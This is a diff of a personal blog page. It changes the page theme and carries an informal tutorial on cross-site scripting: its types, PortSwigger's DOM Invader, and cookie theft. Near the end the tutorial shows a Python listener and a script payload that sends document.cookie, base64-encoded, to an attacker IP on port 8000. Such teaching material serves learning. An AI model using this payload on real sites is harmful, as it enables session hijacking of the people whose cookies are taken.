@@ -4,10 +4,36 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>Cross site scripting | Isuk4</title>
-    <link rel="stylesheet" href="../assets/built/screen.css@v=097bf08f44.css">
+    <title>Cross site scripting | Isuk4</title>
+    <link rel="stylesheet" href="../assets/built/screen.css@v=4d9c548a69.css">
 
-    <link rel="icon" href="../content/images/size/w256h256/2024/03/Group-5-1-1.png" type="image/png">
+
+    <style>
+        :root {
+            --background-color: #111111
+        }
+    </style>
+
+    <script>
+        /* The script for calculating the color contrast was taken from
+        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
+        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
+        accentColor = accentColor.trim().slice(1);
+        var r = parseInt(accentColor.substr(0, 2), 16);
+        var g = parseInt(accentColor.substr(2, 2), 16);
+        var b = parseInt(accentColor.substr(4, 2), 16);
+        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
+        var textColor = (yiq >= 128) ? 'dark' : 'light';
+
+        document.documentElement.className = `has-${textColor}-text`;
+    </script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+        <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,600;0,700;1,400;1,700&display=swap" rel="stylesheet">
+
+    <link rel="icon" href="../content/images/size/w256h256/2024/03/Group-5-1--1-.png" type="image/png">
     <link rel="canonical" href="index.html">
     <meta name="referrer" content="no-referrer-when-downgrade">
     
@@ -26,7 +52,7 @@ how it can be dangerous
 
  1. Code Execution: One of the primary dangers of XSS">
     <meta property="og:url" content="http://localhost:2368/cross-site-scripting-isuk4/">
-    <meta property="og:image" content="http://localhost:2368/content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp">
+    <meta property="og:image" content="http://localhost:2368/content/images/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp">
     <meta property="article:published_time" content="2024-03-10T12:41:26.000Z">
     <meta property="article:modified_time" content="2024-03-10T12:41:26.000Z">
     <meta property="article:tag" content="Web exploits">
@@ -46,7 +72,7 @@ how it can be dangerous
 
  1. Code Execution: One of the primary dangers of XSS">
     <meta name="twitter:url" content="http://localhost:2368/cross-site-scripting-isuk4/">
-    <meta name="twitter:image" content="http://localhost:2368/content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp">
     <meta name="twitter:label1" content="Written by">
     <meta name="twitter:data1" content="Isuka sanuj">
     <meta name="twitter:label2" content="Filed under">
@@ -65,7 +91,7 @@ how it can be dangerous
         "url": "http://localhost:2368/",
         "logo": {
             "@type": "ImageObject",
-            "url": "http://localhost:2368/content/images/2024/03/Group-5-1.png"
+            "url": "http://localhost:2368/content/images/2024/03/Group-5-1--1--1.png"
         }
     },
     "author": {
@@ -80,7 +106,7 @@ how it can be dangerous
     "dateModified": "2024-03-10T12:41:26.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "http://localhost:2368/content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp",
+        "url": "http://localhost:2368/content/images/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp",
         "width": 1200,
         "height": 520
     },
@@ -93,28 +119,32 @@ how it can be dangerous
     <meta name="generator" content="Ghost 5.80">
     <link rel="alternate" type="application/rss+xml" title="Isuk4 " href="../rss/index.html">
     
-    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="26b2165395d797e61c718352f9" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://localhost:2368/" crossorigin="anonymous"></script><style>:root {--ghost-accent-color: #000000;}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="26b2165395d797e61c718352f9" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://localhost:2368/" crossorigin="anonymous"></script><style>:root {--ghost-accent-color: #101010;}</style>
     
     <link href="http://localhost:2368/webmentions/receive/" rel="webmention">
 </head>
 
-<body class="post-template tag-web-exploits is-head-left-logo">
-<div class="site">
+<body class="post-template tag-web-exploits is-font-sans">
+<div class="gh-site">
 
-    <header id="gh-head" class="gh-head gh-outer">
-        <div class="gh-head-inner gh-inner">
-            <div class="gh-head-brand">
-                <div class="gh-head-brand-wrapper">
-                    <a class="gh-head-logo" href="../index.html">
-                            <img src="../content/images/2024/03/Group-5-1.png" alt="Isuk4 ">
-                    </a>
-                </div>
-                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
-                <button class="gh-burger"></button>
+        
+<header id="gh-head" class="gh-head gh-outer is-head-middle-logo">
+    <div class="gh-head-inner gh-inner">
+        <div class="gh-head-brand">
+            <div class="gh-head-brand-wrapper">
+                <a class="gh-head-logo" href="../index.html">
+                        <img src="../content/images/2024/03/Group-5-1--1--1.png" alt="Isuk4 ">
+                </a>
             </div>
+            <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+    <path d="M17.5 17.5L12.5 12.5L17.5 17.5ZM14.1667 8.33333C14.1667 9.09938 14.0158 9.85792 13.7226 10.5657C13.4295 11.2734 12.9998 11.9164 12.4581 12.4581C11.9164 12.9998 11.2734 13.4295 10.5657 13.7226C9.85792 14.0158 9.09938 14.1667 8.33333 14.1667C7.56729 14.1667 6.80875 14.0158 6.10101 13.7226C5.39328 13.4295 4.75022 12.9998 4.20854 12.4581C3.66687 11.9164 3.23719 11.2734 2.94404 10.5657C2.65088 9.85792 2.5 9.09938 2.5 8.33333C2.5 6.78624 3.11458 5.30251 4.20854 4.20854C5.30251 3.11458 6.78624 2.5 8.33333 2.5C9.88043 2.5 11.3642 3.11458 12.4581 4.20854C13.5521 5.30251 14.1667 6.78624 14.1667 8.33333Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+</svg>
+</button>
+            <button class="gh-burger"></button>
+        </div>
 
-            <nav class="gh-head-menu">
-                <ul class="nav">
+        <nav class="gh-head-menu">
+            <ul class="nav">
     <li class="nav-home"><a href="../index.html">Home</a></li>
     <li class="nav-about"><a href="../about-this-site/index.html">About</a></li>
     <li class="nav-web"><a href="../tag/web-exploits/index.html">Web</a></li>
@@ -122,48 +152,43 @@ how it can be dangerous
     <li class="nav-network"><a href="../tag/network-service/index.html">Network </a></li>
 </ul>
 
-            </nav>
+        </nav>
 
-            <div class="gh-head-actions">
-                        <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
-            </div>
-        </div>
-    </header>
-
-
-    <div class="site-content">
         
+    </div>
+</header>
 
-<main class="site-main">
-    <article class="post tag-web-exploits single">
+    
 
-            <header class="post-header gh-canvas">
-                <div class="post-meta">
-    <span class="post-meta-item post-meta-date">
-        <time datetime="2024-03-10">
-            Mar 10, 2024
-        </time>
-    </span>
-        <span class="post-meta-item post-meta-tags">
-                <a class="post-tag post-tag-web-exploits" href="../tag/web-exploits/index.html" title="Web exploits">Web exploits</a>
-        </span>
-</div>                <h1 class="post-title">Cross site scripting | Isuk4</h1>
+<main class="gh-main">
+    <article class="gh-article post tag-web-exploits">
+
+        <header class="gh-article-header gh-canvas">
+            <span class="gh-article-meta"><!--
+            -->
+                        <a class="gh-article-meta-tag" href="../tag/web-exploits/index.html">Web exploits</a>
+<!--
+            --></span>
+
+            <h1 class="gh-article-title">Cross site scripting | Isuk4</h1>
+
+
                     <figure class="gh-article-image kg-width-wide">
-        <img
-            srcset="../content/images/size/w300/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 300w,
-                   ../content/images/size/w720/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpp 720w,
-                  ../content/images/size/w960/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpbp 960w,
-                 ../content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpebp 1200w,
-                ../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpwebp 2000w"
-            sizes="(max-width: 1200px) 100vw, 1200px"
-            src="../content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp"
-            alt="Cross site scripting | Isuk4"
-        >
-    </figure>
-            </header>
+                        <img
+                            srcset="../content/images/size/w300/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp 300w,
+                                   ../content/images/size/w720/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpp 720w,
+                                  ../content/images/size/w960/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpbp 960w,
+                                 ../content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpebp 1200w,
+                                ../content/images/size/w2000/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webpwebp 2000w"
+                            sizes="(max-width: 1200px) 100vw, 1200px"
+                            src="../content/images/size/w1200/2024/03/1_x6wbwE5SIgsO02O3ONbQSg.webp"
+                            alt="Cross site scripting | Isuk4"
+                        >
+                    </figure>
+        </header>
 
-        <div class="post-content gh-content gh-canvas">
-            <p><strong>So lets begin</strong></p><h1 id="what-is-cross-site-scripting">What is Cross site scripting</h1><p>if a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.</p><h1 id="how-it-can-be-dangerous"><strong>how it can be dangerous</strong></h1><ol><li><strong>Code Execution:</strong>&nbsp;One of the primary dangers of XSS is that it allows attackers to execute arbitrary code in the context of a user’s browser. This means the attacker can perform actions on behalf of the user, such as stealing sensitive information (like login credentials or session tokens), manipulating the appearance of the web page, or performing actions on the user’s behalf without their consent.</li><li><strong>Session Hijacking:</strong>&nbsp;By stealing session cookies through XSS, an attacker can impersonate a legitimate user and gain unauthorized access to their accounts. This could lead to account compromise and unauthorized actions on the victim’s behalf.</li><li><strong>Data Theft:</strong>&nbsp;XSS can be used to extract sensitive data from a user’s browser. For example, an attacker might craft a malicious script that sends user data (such as passwords or personal information) to a server under the attacker’s control.</li><li><strong>Phishing Attacks:</strong>&nbsp;XSS can be employed to create realistic-looking phishing pages. When users unknowingly interact with these pages, their login credentials or other sensitive information can be captured by the attacker.</li><li><strong>Drive-by Downloads:</strong>&nbsp;In some cases, XSS can be used to deliver malicious payloads, such as malware or other exploit code, to a user’s system. This can lead to further compromises beyond the scope of the web application.</li><li><strong>Defacement:</strong>&nbsp;XSS can be used to deface websites, altering the appearance of the site to spread political or ideological messages, causing reputational damage to the affected organization.</li><li><strong>SEO Poisoning:</strong>&nbsp;Attackers can use XSS to inject links or content that manipulates search engine rankings, redirecting users to malicious websites or spreading malware.</li></ol><p>ok ima gonna explain about three types</p><h1 id="main-three-types-of-xss">Main Three types of xss</h1><ul><li><strong>Stored XSS (Persistent XSS):</strong>&nbsp;In this type, the malicious script is permanently stored on the target server, often in a database. When a user accesses a particular page or resource containing the injected script, it is retrieved and executed in their browser.</li><li><strong>Reflected XSS (Non-Persistent XSS):</strong>&nbsp;In this case, the malicious script is embedded in a URL or another input, and it is immediately reflected back to the user. The attack is typically carried out by tricking the user into clicking on a crafted link that contains the malicious payload.</li><li><strong>DOM-based XSS:</strong>&nbsp;This occurs when the DOM (Document Object Model) is manipulated by malicious scripts on the client side. The attack takes place within the Document Object Model, and the injected script is processed by the client’s browser.</li></ul><h1 id="dom-invader">DOM Invader</h1><p>DOM Invader is tool that made by Portswigger.that can read dom data in web.so what is that doing for us😑</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:640/1*-dLUICaQ7jY84-n9w9oPiw.gif" class="kg-image" alt="" loading="lazy" width="640" height="640"></figure><p>if it can find DOM data.it can finds dom based xss to</p><p>so let me give you a example</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:513/1*vqT2QRsHpkotTBFklxfPCg.png" class="kg-image" alt="" loading="lazy" width="513" height="536"></figure><p>Hmm its like its search for text “Isuk4” in DOM</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*hRbHpW5RoMjemJY3ZdKOKg.png" class="kg-image" alt="" loading="lazy" width="700" height="373"></figure><p>So i search it to check if DOM Invader can find that text in DOM.So it found it.yeeey😉</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*i1TEOnFhDVbewzJzc4KRWg.png" class="kg-image" alt="" loading="lazy" width="700" height="181"></figure><p>so when i click exploit.Booom💥💥</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*tjxufOFWhiA0udxUbVsQFw.png" class="kg-image" alt="" loading="lazy" width="700" height="95"></figure><p>So like we talked about plenty of thing.mmm and I think we need to talk about Cookie with xss.</p><h1 id="cookie-stealing-with-xsss">Cookie stealing with xsss</h1><p>So i think you know that js can get cookie values.bro if you don’t know just type alert(document.cookie); in you’re browser console</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:599/1*UTJ4CeS9ddwIj1NZ-GffoA.png" class="kg-image" alt="" loading="lazy" width="599" height="199"></figure><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:394/1*eNPUFvb8zYwFndJa2P29jg.png" class="kg-image" alt="" loading="lazy" width="394" height="187"></figure><p>Ok now you know so lets write script for it baby</p><pre><code class="language-Python">from http.server import BaseHTTPRequestHandler, HTTPServer
+    <section class="gh-content gh-canvas">
+        <p><strong>So lets begin</strong></p><h1 id="what-is-cross-site-scripting">What is Cross site scripting</h1><p>if a website that directly renders user input it can be execute a html or js code that’s what we called xss or cross site scripting.</p><h1 id="how-it-can-be-dangerous"><strong>how it can be dangerous</strong></h1><ol><li><strong>Code Execution:</strong>&nbsp;One of the primary dangers of XSS is that it allows attackers to execute arbitrary code in the context of a user’s browser. This means the attacker can perform actions on behalf of the user, such as stealing sensitive information (like login credentials or session tokens), manipulating the appearance of the web page, or performing actions on the user’s behalf without their consent.</li><li><strong>Session Hijacking:</strong>&nbsp;By stealing session cookies through XSS, an attacker can impersonate a legitimate user and gain unauthorized access to their accounts. This could lead to account compromise and unauthorized actions on the victim’s behalf.</li><li><strong>Data Theft:</strong>&nbsp;XSS can be used to extract sensitive data from a user’s browser. For example, an attacker might craft a malicious script that sends user data (such as passwords or personal information) to a server under the attacker’s control.</li><li><strong>Phishing Attacks:</strong>&nbsp;XSS can be employed to create realistic-looking phishing pages. When users unknowingly interact with these pages, their login credentials or other sensitive information can be captured by the attacker.</li><li><strong>Drive-by Downloads:</strong>&nbsp;In some cases, XSS can be used to deliver malicious payloads, such as malware or other exploit code, to a user’s system. This can lead to further compromises beyond the scope of the web application.</li><li><strong>Defacement:</strong>&nbsp;XSS can be used to deface websites, altering the appearance of the site to spread political or ideological messages, causing reputational damage to the affected organization.</li><li><strong>SEO Poisoning:</strong>&nbsp;Attackers can use XSS to inject links or content that manipulates search engine rankings, redirecting users to malicious websites or spreading malware.</li></ol><p>ok ima gonna explain about three types</p><h1 id="main-three-types-of-xss">Main Three types of xss</h1><ul><li><strong>Stored XSS (Persistent XSS):</strong>&nbsp;In this type, the malicious script is permanently stored on the target server, often in a database. When a user accesses a particular page or resource containing the injected script, it is retrieved and executed in their browser.</li><li><strong>Reflected XSS (Non-Persistent XSS):</strong>&nbsp;In this case, the malicious script is embedded in a URL or another input, and it is immediately reflected back to the user. The attack is typically carried out by tricking the user into clicking on a crafted link that contains the malicious payload.</li><li><strong>DOM-based XSS:</strong>&nbsp;This occurs when the DOM (Document Object Model) is manipulated by malicious scripts on the client side. The attack takes place within the Document Object Model, and the injected script is processed by the client’s browser.</li></ul><h1 id="dom-invader">DOM Invader</h1><p>DOM Invader is tool that made by Portswigger.that can read dom data in web.so what is that doing for us😑</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:640/1*-dLUICaQ7jY84-n9w9oPiw.gif" class="kg-image" alt="" loading="lazy" width="640" height="640"></figure><p>if it can find DOM data.it can finds dom based xss to</p><p>so let me give you a example</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:513/1*vqT2QRsHpkotTBFklxfPCg.png" class="kg-image" alt="" loading="lazy" width="513" height="536"></figure><p>Hmm its like its search for text “Isuk4” in DOM</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*hRbHpW5RoMjemJY3ZdKOKg.png" class="kg-image" alt="" loading="lazy" width="700" height="373"></figure><p>So i search it to check if DOM Invader can find that text in DOM.So it found it.yeeey😉</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*i1TEOnFhDVbewzJzc4KRWg.png" class="kg-image" alt="" loading="lazy" width="700" height="181"></figure><p>so when i click exploit.Booom💥💥</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*tjxufOFWhiA0udxUbVsQFw.png" class="kg-image" alt="" loading="lazy" width="700" height="95"></figure><p>So like we talked about plenty of thing.mmm and I think we need to talk about Cookie with xss.</p><h1 id="cookie-stealing-with-xsss">Cookie stealing with xsss</h1><p>So i think you know that js can get cookie values.bro if you don’t know just type alert(document.cookie); in you’re browser console</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:599/1*UTJ4CeS9ddwIj1NZ-GffoA.png" class="kg-image" alt="" loading="lazy" width="599" height="199"></figure><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:394/1*eNPUFvb8zYwFndJa2P29jg.png" class="kg-image" alt="" loading="lazy" width="394" height="187"></figure><p>Ok now you know so lets write script for it baby</p><pre><code class="language-Python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import base64
 from urllib.parse import urlparse, parse_qs
 
@@ -198,90 +223,72 @@ if __name__ == '__main__':
     print('Server running on port 8000...')
     httpd.serve_forever()
 </code></pre><p>mm run this code and exploit the xss by </p><pre><code class="language-hml">&lt;script&gt;fetch(‘http:ip:8000/data=’+btoa(document.cookie));&lt;/script&gt;</code></pre><p>echo "GGS!Ima off";</p><p>GGS!Ima off</p>
-        </div>
+    </section>
 
-        <div class="gh-canvas">
-            <div class="author-list">
-                <h3 class="author-list-title">
-                    Written by:
-                </h3>
-                    <section class="author">
-    <div class="author-image-placeholder u-placeholder">
-        <img class="author-image u-object-fit" src="index.html" alt="Isuka sanuj" loading="lazy">
+
+</article>    </main>
+
+
+
+    
+<footer class="gh-foot gh-outer">
+  <div class="gh-foot-inner gh-inner">
+    <nav class="gh-foot-menu">
+      
+    </nav>
+
+    <div class="gh-copyright">
+        Isuk4.com © 2024
     </div>
-    <div class="author-wrapper">
-        <header class="author-header">
-            <h4 class="author-name"><a href="../author/isuka/index.html">Isuka sanuj</a></h4>
-            <div class="author-social">
-            </div>
-        </header>
-        <div class="author-bio"></div>
-    </div>
-</section>            </div>
-        </div>
-
-    </article>
-</main>
-
-
-    </div>
-
-    <footer class="gh-foot gh-outer">
-        <div class="gh-foot-inner gh-inner">
-            <div class="subscribe">
-                    <a href="https://github.com/isuk4s4" class="subscribe-link" target="_blank" rel="noopener noreferrer">
-                        <svg
-  xmlns="http://www.w3.org/2000/svg"
-  class="ionicon"
-  viewBox="0 0 512 512"
-  width="28"
-  height="28"
-><path
-    d="M256 32C132.3 32 32 134.9 32 261.7c0 101.5 64.2 187.5 153.2 217.9a17.56 17.56 0 003.8.4c8.3 0 11.5-6.1 11.5-11.4 0-5.5-.2-19.9-.3-39.1a102.4 102.4 0 01-22.6 2.7c-43.1 0-52.9-33.5-52.9-33.5-10.2-26.5-24.9-33.6-24.9-33.6-19.5-13.7-.1-14.1 1.4-14.1h.1c22.5 2 34.3 23.8 34.3 23.8 11.2 19.6 26.2 25.1 39.6 25.1a63 63 0 0025.6-6c2-14.8 7.8-24.9 14.2-30.7-49.7-5.8-102-25.5-102-113.5 0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8a18.64 18.64 0 015-.5c8.1 0 26.4 3.1 56.6 24.1a208.21 208.21 0 01112.2 0c30.2-21 48.5-24.1 56.6-24.1a18.64 18.64 0 015 .5c12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6 0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5 0 30.7-.3 55.5-.3 63 0 5.4 3.1 11.5 11.4 11.5a19.35 19.35 0 004-.4C415.9 449.2 480 363.1 480 261.7 480 134.9 379.7 32 256 32z"
-  /></svg>                        <span class="subscribe-text">Github</span>
-                    </a>
-              <a href="https://medium.com/@isuk4" class="subscribe-link" target="_blank" rel="noopener noreferrer">
-                        
-<?xml version="1.0" encoding="UTF-8"?>
-<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
-<svg width="20px" height="20px" viewBox="0 -55 256 256" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid">
-    <g>
-        <path d="M72.2009141,1.42108547e-14 C112.076502,1.42108547e-14 144.399375,32.5485469 144.399375,72.6964154 C144.399375,112.844284 112.074049,145.390378 72.2009141,145.390378 C32.327779,145.390378 0,112.844284 0,72.6964154 C0,32.5485469 32.325326,1.42108547e-14 72.2009141,1.42108547e-14 Z M187.500628,4.25836743 C207.438422,4.25836743 223.601085,34.8960455 223.601085,72.6964154 L223.603538,72.6964154 C223.603538,110.486973 207.440875,141.134463 187.503081,141.134463 C167.565287,141.134463 151.402624,110.486973 151.402624,72.6964154 C151.402624,34.9058574 167.562834,4.25836743 187.500628,4.25836743 Z M243.303393,11.3867175 C250.314,11.3867175 256,38.835526 256,72.6964154 C256,106.547493 250.316453,134.006113 243.303393,134.006113 C236.290333,134.006113 230.609239,106.554852 230.609239,72.6964154 C230.609239,38.837979 236.292786,11.3867175 243.303393,11.3867175 Z" fill="#000000">
-
-</path>
-    </g>
-</svg>                        <span class="subscribe-text">Medium</span>
-                    </a>
-                    <a href="https://facebook.com/isuka.cracker" class="subscribe-link" target="_blank" rel="noopener noreferrer">
-                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-<path d="M16 8.04865C16 3.63065 12.418 0.048645 8 0.048645C3.582 0.048645 0 3.63065 0 8.04865C0 12.042 2.92533 15.3513 6.75 15.9513V10.3613H4.71867V8.04798H6.75V6.28665C6.75 4.28198 7.94467 3.17398 9.772 3.17398C10.6467 3.17398 11.5627 3.33065 11.5627 3.33065V5.29931H10.5533C9.55933 5.29931 9.24933 5.91598 9.24933 6.54865V8.04865H11.468L11.1133 10.362H9.24933V15.952C13.0747 15.3513 16 12.0413 16 8.04865Z" fill="currentColor"/>
-</svg>
-                        <span class="subscribe-text">Facebook</span>
-                    </a>
-                    
-            </div>
-            <nav class="gh-foot-menu">
-                
-            </nav>
-            <div class="gh-copyright">
-                Isuk4  © 2024. Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
-            </div>
-        </div>
-    </footer>
-
-
+  </div>
+</footer>
 </div>
 
-<script
-    src="https://code.jquery.com/jquery-3.3.1.min.js"
-    integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
-    crossorigin="anonymous">
-</script>
-<script src="../assets/built/main.min.js@v=097bf08f44"></script>
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
 
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
 
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="../assets/built/main.min.js@v=4d9c548a69"></script>
 
 
 
 </body>
+
 </html>
